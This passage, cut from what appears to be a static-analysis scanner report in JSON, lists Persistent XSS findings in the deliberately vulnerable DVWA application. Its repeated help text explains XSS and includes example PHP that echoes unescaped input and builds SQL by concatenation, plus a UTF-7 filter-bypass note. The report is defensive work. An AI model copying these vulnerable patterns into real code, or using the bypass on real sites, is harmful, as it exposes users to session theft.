as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4470/?engineType=SCA&issue=44E5A2FE685EAAF8FE335351C62AB6F3"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4520",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Persistent"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of persistent (also known as stored) XSS, the untrusted source is typically a database or other back-end data store, while in the case of reflected XSS it is typically a web request.\n\n\nIn this case, the data enters at mysqli_query() in low.php on line 13.\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nThis code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nExample 2: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nAs in Example 1, this code operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4520/?engineType=SCA&issue=643930933CB339199CBD242CD193DB95"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4521",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Persistent"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of persistent (also known as stored) XSS, the untrusted source is typically a database or other back-end data store, while in the case of reflected XSS it is typically a web request.\n\n\nIn this case, the data enters at mysqli_query() in low.php on line 11.\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nThis code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nExample 2: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nAs in Example 1, this code operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4521/?engineType=SCA&issue=643930933CB339199CBD242CD193DB96"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4556",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Persistent"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of persistent (also known as stored) XSS, the untrusted source is typically a database or other back-end data store, while in the case of reflected XSS it is typically a web request.\n\n\nIn this case, the data enters at mysqli_query() in high.php on line 20.\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nThis code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nExample 2: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nAs in Example 1, this code operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4556/?engineType=SCA&issue=79476D57F56E8EADA08C350075011DB0"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4557",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Persistent"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
